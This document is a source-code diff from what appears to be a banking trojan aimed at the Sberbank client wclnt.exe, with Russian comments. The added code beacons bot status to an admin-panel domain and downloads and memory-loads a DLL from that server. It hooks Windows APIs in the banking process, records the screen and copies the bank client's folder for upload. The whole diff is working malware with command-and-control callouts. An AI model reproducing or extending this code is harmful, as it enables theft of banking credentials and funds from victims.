@@ -16,6 +16,7 @@
 #include "DllLoader.h"
 #include "VideoRecorder.h"
 #include "Inject.h"
+#include "BotCore.h"
 
 #include "CabPacker.h"
 #include "Loader.h"
@@ -84,6 +85,8 @@ static PGetOpenFileNameA Real_GetOpenFileNameA;
 static PLoadLibraryExW Real_LoadLibraryExW;
 static PRegQueryValueExA Real_RegQueryValueExA;
 
+char domain[128]; //адрес админки
+char botUid[128];
 
 //создает имя файла для хранения dll в файле
 static PCHAR GetNameDll(char* uid)
@@ -115,14 +118,23 @@ static char* GetAdminUrl( char* url )
 	return url;
 }
 
+static void SendLogToAdmin( int num )
+{
+	char qr[128];
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	pwsprintfA( qr, "http://%s/set/bit.html?uid=%s&sum=%d&type=cber&mode=stat", domain, BOT_UID, num );
+	THTTPResponse Response;
+	ClearStruct(Response);
+	HTTP::Get( qr, 0, &Response );
+	DBG( "Sber", "Отсылка лога: %s", qr );
+	HTTPResponse::Clear(&Response);
+}
 
 static BYTE* LoadSluiceDll( char* uid )
 {
-	char domen[128];
-	if( GetAdminUrl(domen) == 0 ) return 0;
 	char url[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( url, "http://%s/s.dll", domen );
+	pwsprintfA( url, "http://%s/s.dll", domain );
 
 	BYTE* module = 0;
 	char* nameFile = GetNameDll(uid);
@@ -133,7 +145,7 @@ static BYTE* LoadSluiceDll( char* uid )
 
 	if(!HTTP::Get( url, (char**)&module, 0 ))
 	{
-		DBG( "Sber", "не удаеться скачать нужную длл, проверьте есть ли она по адресу s%", url );
+		DBG( "Sber", "не удаеться скачать нужную длл, проверьте есть ли она по адресу %s", url );
 		if( nameFile )
 		{
 			DWORD sz;
@@ -185,12 +197,11 @@ static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* na
 
 static bool HookSberApi()
 {
-	PCHAR UID = STR::Alloc(120);
-	GenerateUid(UID);
-	DBG( "Sber", "UID: %s", UID );
+	DBG( "Sber", "UID: %s", BOT_UID );
 
-	BYTE* BotModule = LoadSluiceDll(UID);
+	BYTE* BotModule = LoadSluiceDll(BOT_UID);
 	if( BotModule == 0 ) return false;
+	SendLogToAdmin(2);
 	
 	HMEMORYMODULE hLib = MemoryLoadLibrary(BotModule);
 	if( hLib == NULL )
@@ -218,12 +229,10 @@ static bool HookSberApi()
 	
 	char HostOfBots[128];
 	const char http[] = {'h','t','t','p',':','/','/', 0};
-	m_memcpy( HostOfBots, http, 8 );
-	GetAdminUrl( HostOfBots + 7 );
-	SetParamsSBR( HostOfBots, UID );
-	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, UID );
-	STR::Free(UID);
-
+	m_lstrcpy( HostOfBots, http );
+	m_lstrcat( HostOfBots, domain );
+	SetParamsSBR( HostOfBots, BOT_UID );
+	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, BOT_UID );
 
 	//Подгружаем из длл хуки и устанавливаем
 	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", 3, 0x7506E960, Real_ShowWindow );
@@ -243,6 +252,7 @@ static bool HookSberApi()
 	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", 2, 0x1802E7C8, Real_RegQueryValueExA );
 
 	DBG( "Sber", "Установка хуков выполнена" );
+	SendLogToAdmin(3);
 
 	StartRecordThread( GetUniquePID(), "Sber", NULL, NULL, 700 );
 
@@ -267,7 +277,7 @@ static bool HookSberApi()
 //непосредственное копирование папки сбера, сначала копирует во временную папку, а потом отсылает на сервер с временной папки
 static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
-
+	BOT::Initialize();
 	// При отправке данных сбера включаем режим Банк
     SetBankingMode();
 
@@ -369,14 +379,25 @@ static void CopyFolderForVersion( const char* appName )
 	}
 }
 
+//инициализирует глобальные переменные 
+static bool InitData()
+{
+	if( GetAdminUrl(domain) == 0 ) return false;
+	return true;
+}
+
 bool Init( const char* appName, DWORD appHash )
 {
 	if ( appHash == 0x321ecf12 /*wclnt.exe*/ )
 	{
-		UnhookSber();
-		HookSberApi();
-		CopyFolderForVersion(appName);
-		return true;
+		if( InitData() ) 
+		{
+			SendLogToAdmin(1);
+			UnhookSber();
+			HookSberApi();
+			CopyFolderForVersion(appName);
+			return true;
+		}
 	}
 	return false;
 }
